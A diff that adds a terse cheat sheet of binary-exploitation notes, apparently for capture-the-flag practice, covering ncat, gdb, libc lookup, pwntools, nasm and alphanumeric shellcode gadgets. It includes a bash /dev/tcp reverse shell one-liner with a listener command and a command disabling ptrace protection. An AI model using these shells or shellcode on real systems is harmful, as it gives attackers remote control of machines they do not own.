@@ -1,0 +1,75 @@
+ncat bind service to port:
+	ncat -vc ./binary -kl 127.0.0.1 7122
+	ncat -vc 'strace -e trace=read,write ./binary' -kl ::1 2217
+
+gdb:
+	layout asm (ctrl+x a)
+	i b (instruction breakpoint)
+	bt (backtrace)
+	fin (finish this function)
+	attach pid (echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope)
+
+reverse shell:
+	ncat -vlp [port]
+	system("bash -c 'bash -i >& /dev/tcp/[ip]/[port] 0>&1'")
+
+find libc version:
+	http://libcdb.com/
+	/lib/x86_64-linux-gnu/libc.so.6
+
+turn off alarm:
+	sed -i s/alarm/isnan/g ./binary
+	LD_PRELOAD=~/tools/preeny/x86_blabla/dealarm.so
+
+decompile arm:
+	retargetable decompiler
+
+compile .so:
+	gcc hook.c -o hook.so -shared -fPIC (-m32)
+
+LD_SHOW_AUXV:
+	T_BASE (libc base)
+	AT_RANDOM (canary)
+	ncat -vc 'LD_SHOW_AUXV=1 ./binary' -kl 127.0.0.1 7122
+
+qira:
+	web gdb with back
+
+pwntools:
+	context.arch='i386'
+	asm(shellcraft.sh())
+
+nasm:
+	nasm -felf32 shell.asm -o shell.o
+	ld -melf_i386 shell.o shell
+	objcopy -O binary shell.o shell.bin
+	objdump -b binary -m i386 -D shell.bin
+
+alphanumeric shellcode:
+	LLLLY (get shellcode address)
+		dec esp
+		dec esp
+		dec esp
+		dec esp
+		pop ecx
+	jDX4C (set eax value = 1)
+		push 0x44
+		pop eax
+		xor al,0x43
+	jDX0A1 (modify shellcode)
+		push 0x44
+		pop eax
+		xor BYTE_PTR [ecx+0x31],al
+	PQRSTUVWa (popa for ebx)
+		push eax
+		push ecx
+		push edx
+		push ebx
+		push esp
+		push ebp
+		push esi
+		push edi
+		popa
+
+		
+
